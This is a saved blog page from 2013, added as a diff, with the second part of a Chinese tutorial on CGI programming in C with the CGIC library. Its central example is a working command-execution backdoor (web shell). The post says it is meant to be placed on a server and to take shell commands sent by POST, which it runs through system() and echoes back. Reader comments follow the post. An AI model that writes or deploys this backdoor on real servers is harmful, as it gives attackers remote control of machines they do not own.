@@ -1,0 +1,340 @@
+
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
+<meta content="phithon的小站，长期存在与分享关于网络安全与各种编程的原创文章。" name="description"/>
+<meta content="网络安全,代码审计,信息安全,漏洞挖掘,php,C++,mysql,python" name="keywords"/>
+<link href="./C语言CGI编程二 - 编写cmd后门  离别歌/favicon.ico" rel="shortcut icon"/>
+<link href="./C语言CGI编程二 - 编写cmd后门  离别歌/favicon-192x192.png" rel="icon" sizes="192x192" type="image/png"/>
+<link href="./C语言CGI编程二 - 编写cmd后门  离别歌/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/>
+<title>C语言CGI编程二 - 编写cmd后门 | 离别歌</title>
+<link href="./C语言CGI编程二 - 编写cmd后门  离别歌/font-awesome.min.css" rel="stylesheet"/>
+<link href="./C语言CGI编程二 - 编写cmd后门  离别歌/styles.css" rel="stylesheet"/>
+<link href="./C语言CGI编程二 - 编写cmd后门  离别歌/style.css" rel="stylesheet"/>
+<link href="./C语言CGI编程二 - 编写cmd后门  离别歌/flexboxgrid.min.css" rel="stylesheet"/>
+<link href="./C语言CGI编程二 - 编写cmd后门  离别歌/feed" rel="alternate" title="离别歌" type="application/atom+xml">
+<script src="./C语言CGI编程二 - 编写cmd后门  离别歌/jquery.min.js"></script>
+<link href="./C语言CGI编程二 - 编写cmd后门  离别歌/code.css" rel="stylesheet"/>
+<link href="./C语言CGI编程二 - 编写cmd后门  离别歌/button.css" rel="stylesheet"/>
+<link href="./C语言CGI编程二 - 编写cmd后门  离别歌/pagination.css" rel="stylesheet"/>
+<link href="./C语言CGI编程二 - 编写cmd后门  离别歌/jquery.fancybox.min.css" rel="stylesheet"/>
+</link></meta></head>
+<body>
+<div id="header-post">
+<a class="active" href="#" id="menu-icon"><i class="fa fa-bars fa-lg"></i></a>
+<a class="active" href="#" id="menu-icon-tablet"><i class="fa fa-bars fa-lg"></i></a>
+<a href="#" id="top-icon-tablet" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+<span id="menu" style="visibility: visible">
+<span id="nav">
+<ul>
+<li><a href="/">主页</a></li>
+<li><a href="javascript:history.back(-1)">返回</a></li>
+</ul>
+</span>
+<br/>
+<span id="actions">
+<ul>
+<li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i aria-hidden="true" class="fa fa-chevron-up" onmouseout="$('#i-top').toggle();" onmouseover="$('#i-top').toggle();"></i></a></li>
+<li><a class="icon" href="#"><i aria-hidden="true" class="fa fa-share-alt" onclick="$('#share').toggle();return false;" onmouseout="$('#i-share').toggle();" onmouseover="$('#i-share').toggle();"></i></a></li>
+</ul>
+<span class="info" id="i-top" style="display:none;">Back to top</span>
+<span class="info" id="i-share" style="display:none;">Share post</span>
+</span>
+<br/>
+<div id="share" style="display: none">
+<ul>
+<li><a class="icon" href="http://www.facebook.com/sharer.php?u=https%3A//www.leavesongs.com/C/CGIforC_2.html"><i aria-hidden="true" class="fa fa-facebook "></i></a></li>
+<li><a class="icon" href="https://twitter.com/share?url=https%3A//www.leavesongs.com/C/CGIforC_2.html&amp;text=C%E8%AF%AD%E8%A8%80CGI%E7%BC%96%E7%A8%8B%E4%BA%8C%20-%20%E7%BC%96%E5%86%99cmd%E5%90%8E%E9%97%A8"><i aria-hidden="true" class="fa fa-twitter "></i></a></li>
+<li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3A//www.leavesongs.com/C/CGIforC_2.html&amp;title=C%E8%AF%AD%E8%A8%80CGI%E7%BC%96%E7%A8%8B%E4%BA%8C%20-%20%E7%BC%96%E5%86%99cmd%E5%90%8E%E9%97%A8"><i aria-hidden="true" class="fa fa-linkedin "></i></a></li>
+<li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3A//www.leavesongs.com/C/CGIforC_2.html&amp;is_video=false&amp;description=C%E8%AF%AD%E8%A8%80CGI%E7%BC%96%E7%A8%8B%E4%BA%8C%20-%20%E7%BC%96%E5%86%99cmd%E5%90%8E%E9%97%A8"><i aria-hidden="true" class="fa fa-pinterest "></i></a></li>
+<li><a class="icon" href="mailto:?subject=C%E8%AF%AD%E8%A8%80CGI%E7%BC%96%E7%A8%8B%E4%BA%8C%20-%20%E7%BC%96%E5%86%99cmd%E5%90%8E%E9%97%A8&amp;body=Check out this article: https%3A//www.leavesongs.com/C/CGIforC_2.html"><i aria-hidden="true" class="fa fa-envelope "></i></a></li>
+<li><a class="icon" href="https://getpocket.com/save?url=https%3A//www.leavesongs.com/C/CGIforC_2.html&amp;title=C%E8%AF%AD%E8%A8%80CGI%E7%BC%96%E7%A8%8B%E4%BA%8C%20-%20%E7%BC%96%E5%86%99cmd%E5%90%8E%E9%97%A8"><i aria-hidden="true" class="fa fa-get-pocket "></i></a></li>
+<li><a class="icon" href="http://reddit.com/submit?url=https%3A//www.leavesongs.com/C/CGIforC_2.html&amp;title=C%E8%AF%AD%E8%A8%80CGI%E7%BC%96%E7%A8%8B%E4%BA%8C%20-%20%E7%BC%96%E5%86%99cmd%E5%90%8E%E9%97%A8"><i aria-hidden="true" class="fa fa-reddit "></i></a></li>
+<li><a class="icon" href="http://www.stumbleupon.com/submit?url=https%3A//www.leavesongs.com/C/CGIforC_2.html&amp;title=C%E8%AF%AD%E8%A8%80CGI%E7%BC%96%E7%A8%8B%E4%BA%8C%20-%20%E7%BC%96%E5%86%99cmd%E5%90%8E%E9%97%A8"><i aria-hidden="true" class="fa fa-stumbleupon "></i></a></li>
+<li><a class="icon" href="http://digg.com/submit?url=https%3A//www.leavesongs.com/C/CGIforC_2.html&amp;title=C%E8%AF%AD%E8%A8%80CGI%E7%BC%96%E7%A8%8B%E4%BA%8C%20-%20%E7%BC%96%E5%86%99cmd%E5%90%8E%E9%97%A8"><i aria-hidden="true" class="fa fa-digg "></i></a></li>
+<li><a class="icon" href="http://www.tumblr.com/share/link?url=https%3A//www.leavesongs.com/C/CGIforC_2.html&amp;name=C%E8%AF%AD%E8%A8%80CGI%E7%BC%96%E7%A8%8B%E4%BA%8C%20-%20%E7%BC%96%E5%86%99cmd%E5%90%8E%E9%97%A8&amp;description="><i aria-hidden="true" class="fa fa-tumblr "></i></a></li>
+</ul>
+</div>
+</span>
+</div>
+<div class="content index width mx-auto px2 my4">
+<article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header>
+<h1 class="posttitle" itemprop="name headline">C语言CGI编程二 - 编写cmd后门</h1>
+<div class="meta">
+<span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+<span itemprop="name">Phithon</span>
+</span>
+<div class="postdate">
+<time datetime="2013年5月21日 18:41" itemprop="datePublished">
+                    2013 五月 21 18:41
+                </time>
+</div>
+<div class="article-tag">
+            阅读：8335
+            </div>
+<div class="article-tag">
+<i class="fa fa-bookmark"></i>
+<a class="tag-link" href="/sort/C">C/C++</a>
+</div>
+<div class="article-tag">
+<i class="fa fa-tag"></i>
+<a class="tag-link" href="/tag/cmd%E5%90%8E%E9%97%A8">cmd后门</a>,
+                
+                <a class="tag-link" href="/tag/web%E5%BA%94%E7%94%A8">web应用</a>,
+                
+                <a class="tag-link" href="/tag/CGI">CGI</a>
+</div>
+</div>
+</header>
+<div class="content" itemprop="articleBody">
+<p>
+<span style="font-size:14px;">    </span><span style="font-size:14px;"><a href="https://www.leavesongs.com/WEB/CGIforC_1.html" target="_blank">接着C语言CGI编程入门(一)</a></span><span style="font-size:14px;">，这次来介绍一个C语言库，叫“CGIC”，这是他们的官网：</span><span style="font-size:14px;"><a href="http://www.boutell.com/cgic/" target="_blank">http://www.boutell.com/cgic/</a><a href="http://www.boutell.com/cgic/"><strong></strong></a></span>
+</p>
+<p>
+<span style="font-size:14px;">    里面该说的都说的很清楚。今天我们来用它来做一个后门，将后门放在有执行cgi权限的服务器上，通过客户端POST命令到cgi上并执行，达到控制服务器的目的。</span>
+</p>
+<p>
+<span style="font-size:14px;">    首先下载官网上的压缩包。解压里面有cgic.c和cgic.h,这是我们需要用到的文件。(另外两个c文件是演示用的，还有一个makefile是linux下使用的，在VS2010中我没有用到它)</span>
+</p>
+<p>
+<span style="font-size:14px;">    从官方的文档和下载的cgictest.c可以看到，这个库里有main函数。因为一个程序只能有一个入口点函数，所以我们不能再定义main函数。这里，我们新建一个工程，将上面说的cgic.c和cgic.h拷贝到工程目录下，最好把cgic.c改成cgic.cpp，这样我们就能用C++的语法来写程序了。</span>
+</p>
+<p>
+<span style="font-size:14px;">    再在工程中添加一个cgiMain.cpp的文件，我们将代码写在其中。我们这个程序只用写一个函数，cgiMain，再包含ccgi库的头文件就行了。</span>
+</p>
+<p>
+<span style="font-size:14px;">    cgiMain我们尽可以把它想象成main函数，只不过名字不一样罢了，我们把自己的代码写进去。执行的时候也和main完全一样，以return 0;退出。</span>
+</p>
+<p>
+<span style="font-size:14px;">    我的这个cmd后门的代码如下：</span>
+</p>
+<pre class="brush:cpp;">int cgiMain()
+{
+	cgiHeaderContentType("text/html");
+	char szPost[256];
+	cgiFormString("cmd",szPost,sizeof(szPost));
+	string strRe,strComm = szPost;
+	strComm += "&gt;01.tmp";
+	system(strComm.c_str());
+	ifstream file("01.tmp",ios::in);
+	while (getline(file,strRe))
+	{
+		cout&lt;&lt;strRe&lt;&lt;"&lt;br /&gt;";
+	}
+	file.close();
+	remove("01.tmp");
+	return 0;
+}</pre>
+<p>
+<span style="font-size:14px;">    比较简陋，只是来演示一下cgic库的使用。  </span>
+</p>
+<p>
+<span style="font-size:14px;">    cgiHeaderContentType是输出html文件的头。我上一篇文章讲了在cgi需要输出内容时，需要先输出</span><span style="font-size:14px;">"Content-type:text/html\n\n"，这个函数就是起到这个作用。大家看源代码也可以看到。</span>
+</p>
+<p>
+<span style="font-size:14px;">    cgiFormString("cmd",szPost,sizeof(szPost));这个函数很重要。众所周知，POST或GET到的字符串是这样一个格式：a=xxxxxx&amp;b=yyyyyy&amp;c=112233。我们这个函数，就是获得每一个索引对应的值。</span>
+</p>
+<p>
+<span style="font-size:14px;">    第一个参数是索引的名字，第二个参数是保存获取到的值的字符串，第三个值是字符串大小。比如我们获取到的是cmd=ipconfig，则通过索引“cmd”就能获取到值ipconfig。</span>
+</p>
+<p>
+<span style="font-size:14px;">    原则上来说，获取到了值，也就是命令的内容“ipconfig”，我们就可以执行了。但是我用的system函数不能返回执行结果。所以我换个方式，将执行的结果放入一个临时文件，然后从文件中获取到执行结果并删除文件。这也就是我后面的代码做的工作。都是CPP的内容我就不细讲了，文件操作也可以使用C语言中的fopen、fgets，效果相同。</span>
+</p>
+<p>
+<span style="font-size:14px;">    提一下，如果要把一个命令的输出内容放入文件，直接在命令后面加"&gt;xx.txt"就行，就输出到了xx.txt文件中（绝对路径也行）。</span>
+</p>
+<hr/>
+<p>
+<span style="font-size:14px;">    ccgi是一个优秀的C语言CGI库，英语不好的同学可以结合我附件中的doc，里面有各个函数的中文介绍，包括设置cookie、上传文件等等功能。所以说很强大。  </span>
+</p>
+<p>
+<span style="font-size:14px;">    演示一下效果:</span>
+</p>
+<p>
+<span style="font-size:14px;">    在本地html（本地客户端请大家自己思考着自己写）中输入命令：</span>
+</p>
+<p>
+<span style="font-size:14px;">    </span><a href="https://www.leavesongs.com/content/uploadfile/201305/4efd1369137507.jpg" id="ematt:108" target="_blank"><img alt="01.jpg" border="0" height="276" src="./C语言CGI编程二 - 编写cmd后门  离别歌/4efd1369137507.jpg" title="点击查看原图" width="396"/></a>
+</p>
+<p>
+<span style="font-size:14px;">    点击提交后返回结果：</span>
+</p>
+<p>
+<span style="font-size:14px;">    </span><a href="https://www.leavesongs.com/content/uploadfile/201305/3fb51369137507.jpg" id="ematt:109" target="_blank"><img alt="02.jpg" border="0" height="460" src="./C语言CGI编程二 - 编写cmd后门  离别歌/thum-3fb51369137507.jpg" title="点击查看原图" width="389"/></a>
+</p>
+<p>
+<br>
+</br></p>
+<p>
+	    附件：<span class="attachment"><a href="https://www.leavesongs.com/content/uploadfile/201305/ddc11369136903.zip" target="_blank">cgic函数说明.zip</a></span>
+</p>
+</div>
+</article>
+<div id="reply-list">
+<h1>评论</h1>
+<div class="row" id="comment-2683">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./C语言CGI编程二 - 编写cmd后门  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://sfantree.com" target="_blank">popy32</a>
+<time datetime="2017年5月1日 20:21" itemprop="datePublished">
+                            2017 五月 01 20:21
+                        </time>
+<a href="javascript:reply_to('2683', 'popy32')">回复</a>
+</p>
+<p class="comment-meta">文章不错，还提供了文档,博主用心了</p>
+</div>
+</div>
+<div class="row" id="comment-2156">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./C语言CGI编程二 - 编写cmd后门  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.code592.com" target="_blank">Jack</a>
+<time datetime="2015年6月22日 13:44" itemprop="datePublished">
+                            2015 六月 22 13:44
+                        </time>
+<a href="javascript:reply_to('2156', 'Jack')">回复</a>
+</p>
+<p class="comment-meta">谢谢博主让我了解到了一种CGI的漏洞！</p>
+</div>
+</div>
+<div class="row" id="comment-1914">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./C语言CGI编程二 - 编写cmd后门  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">蛋蛋</a>
+<time datetime="2015年1月5日 20:09" itemprop="datePublished">
+                            2015 一月 05 20:09
+                        </time>
+<a href="javascript:reply_to('1914', '蛋蛋')">回复</a>
+</p>
+<p class="comment-meta">为什么下载不了呢？</p>
+</div>
+</div>
+<div class="row" id="comment-1530">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./C语言CGI编程二 - 编写cmd后门  离别歌/0d74f0d23b116b890f29f280559d4901.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">该昵称已屏蔽</a>
+<time datetime="2013年12月25日 16:56" itemprop="datePublished">
+                            2013 十二月 25 16:56
+                        </time>
+<a href="javascript:reply_to('1530', '该昵称已屏蔽')">回复</a>
+</p>
+<p class="comment-meta">该评论已屏蔽</p>
+</div>
+</div>
+<div class="row" id="comment-1335">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./C语言CGI编程二 - 编写cmd后门  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://kxnj.com" target="_blank">开心果</a>
+<time datetime="2013年5月23日 08:08" itemprop="datePublished">
+                            2013 五月 23 08:08
+                        </time>
+<a href="javascript:reply_to('1335', '开心果')">回复</a>
+</p>
+<p class="comment-meta">呃，博主是高手，这些知识俺学不来。</p>
+</div>
+</div>
+<div class="row" id="comment-1332">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./C语言CGI编程二 - 编写cmd后门  离别歌/127e3c1cc14687ab082efc144ba2443e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.cafa.me" target="_blank">毕加波</a>
+<time datetime="2013年5月21日 23:46" itemprop="datePublished">
+                            2013 五月 21 23:46
+                        </time>
+<a href="javascript:reply_to('1332', '毕加波')">回复</a>
+</p>
+<p class="comment-meta">C...至今还没有学..</p>
+</div>
+</div>
+</div>
+<form action="#reply" enctype="multipart/form-data" id="reply" method="post">
+<textarea cols="40" id="id_content" name="content" required="" rows="6">
+</textarea>
+<div class="row">
+<div class="col-xs-4">
+<input id="id_nickname" maxlength="64" name="nickname" placeholder="昵称" required="" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_email" maxlength="254" name="email" placeholder="邮箱（可留空）" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_url" maxlength="200" name="url" placeholder="链接（可留空）" type="text"/>
+</div>
+</div>
+<div class="row" style="margin-top: 8px"><div class="col-xs-4"><input autocomplete="off" id="id_captcha_1" name="captcha_1" placeholder="验证码" type="text"/> <input id="id_captcha_0" name="captcha_0" type="hidden" value="e8b1b28ff587c9d61fc1df988360480c110c7db8"/>
+</div><div class="col-xs-4">
+<img alt="captcha" class="captcha" height="25" src="./C语言CGI编程二 - 编写cmd后门  离别歌/e8b1b28ff587c9d61fc1df988360480c110c7db8"/></div></div>
+<div class="clearfix"></div>
+<input class="ui-button ui-button-sgreen" type="submit" value="提交"/>
+<input id="id_archive" name="archive" type="hidden" value="256">
+<input id="id_parent" name="parent" type="hidden"/>
+<input name="csrfmiddlewaretoken" type="hidden" value="s5wNQsOCqEMGY2w2fGShRZyFwT20uSDh0pRjEW0RRrG5YHUh3Xm1qDAKFXv8dmsr"/>
+</input></form>
+</div>
+<footer id="footer">
+<div class="footer-left">
+    Copyright © 2017 Powered by talkbook
+  </div>
+<div class="footer-right">
+<nav>
+<ul>
+<li><a href="/">首页</a></li>
+<li><a href="http://weibo.com/101yx" target="_blank">微博</a></li>
+<li><a href="https://github.com/phith0n" target="_blank">项目</a></li>
+<li><a href="/template/change/">更换模板</a></li>
+</ul>
+</nav>
+</div>
+</footer>
+<script src="./C语言CGI编程二 - 编写cmd后门  离别歌/main.js"></script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?ad9ab5e37c2811b9f0979e46123fc898";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<script src="./C语言CGI编程二 - 编写cmd后门  离别歌/jquery.fancybox.pack.js"></script>
+<script>
+$(document).ready(function () {
+    $("article a").each(function (i, e) {
+        if(e.host != 'www.leavesongs.com') {
+            e.target = '_blank';
+        }
+    });
+    $("article img").each(function (i, e) {
+        if(e.parentNode.tagName.toUpperCase() != 'A') {
+            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
+        } else {
+            $(e.parentNode).addClass('fancybox');
+        }
+    });
+    $('.fancybox').fancybox();
+})
+</script>
+</body>
+</html>
